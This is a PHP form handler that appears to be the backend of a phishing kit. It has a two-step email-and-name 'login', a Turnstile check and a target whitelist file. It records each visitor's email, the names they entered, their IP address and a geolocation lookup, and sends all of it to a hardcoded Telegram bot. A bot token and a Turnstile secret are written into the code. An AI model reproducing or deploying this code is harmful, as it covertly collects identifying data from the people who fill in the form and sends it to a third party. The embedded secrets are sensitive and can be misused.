<?php
session_start();
define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');

// === TOGGLE: email validation ON/OFF ===
$EMAIL_VALIDATION_ENABLED = false; // <<< set to false to DISABLE whitelist email validation

$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$telegram_chat_id   = "6915371044";
$turnstile_secret   = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
$whitelist_file     = __DIR__ . '/papa.txt';

// Detect accurate visitor IP
function get_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// Load previous attempts
$attempts = [];
if (file_exists(ATTEMPTS_FILE)) {
    $data = json_decode(file_get_contents(ATTEMPTS_FILE), true);
    if (is_array($data)) $attempts = $data;
}

// Step 1: Email submission
if (isset($_POST['email'])) {
    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
    $turnstile_response = $_POST['cf-turnstile-response'] ?? '';

    if (!$email) {
        $_SESSION['error_message'] = "Invalid email.";
        header("Location: index.php"); exit;
    }

    // Verify Turnstile
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret'   => $turnstile_secret,
        'response' => $turnstile_response,
        'remoteip' => get_client_ip()
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $turnstile_result = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (empty($turnstile_result['success'])) {
        $_SESSION['error_message'] = "Turnstile verification failed.";
        header("Location: index.php"); exit;
    }

    // Validate email against whitelist (ONLY if enabled)
    if ($EMAIL_VALIDATION_ENABLED) {
        if (!file_exists($whitelist_file)) {
            $_SESSION['error_message'] = "Configuration error: whitelist missing.";
            header("Location: index.php"); exit;
        }

        $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $whitelist = array_map('trim', $whitelist);

        if (!in_array($email, $whitelist, true)) {
            $_SESSION['error_message'] = "Email not allowed.";
            header("Location: index.php"); exit;
        }
    }

    // Email valid (or validation disabled), proceed to step 2
    $_SESSION['step'] = 2;
    $_SESSION['old_email'] = $email;
    header("Location: index.php"); exit;
}

// Step 2: Name submission
if (isset($_POST['name'])) {
    $email = $_SESSION['old_email'] ?? '';
    $name  = trim($_POST['name']);

    if (!$email || !$name) {
        $_SESSION['error_message'] = "Invalid input.";
        header("Location: index.php"); exit;
    }

    $ip = get_client_ip();

    // Location info
    $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
    $location = ($geo && isset($geo['country']))
        ? ($geo['country'] . ", " . $geo['regionName'] . ", " . $geo['city'])
        : "Unknown";

    // Update attempts
    if (!isset($attempts[$email])) {
        $attempts[$email] = [
            'names'    => [$name],
            'count'    => 1,
            'ip'       => $ip,
            'location' => $location
        ];
    } else {
        $attempts[$email]['names'][] = $name;
        $attempts[$email]['count']  += 1;
        $attempts[$email]['ip']      = $ip;
        $attempts[$email]['location']= $location;
    }

    file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));

    // Telegram notification
    $msg  = "Login attempt for $email\n";
    $msg .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
    $msg .= "Total attempts: {$attempts[$email]['count']}\n";
    $msg .= "IP: $ip\n";
    $msg .= "Location: $location";

    @file_get_contents(
        "https://api.telegram.org/bot$telegram_bot_token/sendMessage" .
        "?chat_id=$telegram_chat_id&text=" . urlencode($msg)
    );

    // Correct name check
    $correct_name = "John Doe";

    if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
        header("Location: https://example.com/blocked"); exit;
    } elseif ($name !== $correct_name) {
        $_SESSION['error_message'] = "Incorrect name entered.";
        header("Location: index.php"); exit;
    }

    // Success
    unset($_SESSION['old_email'], $_SESSION['step']);
    header("Location: dashboard.php"); exit;
}

header("Location: index.php");
exit;
?>
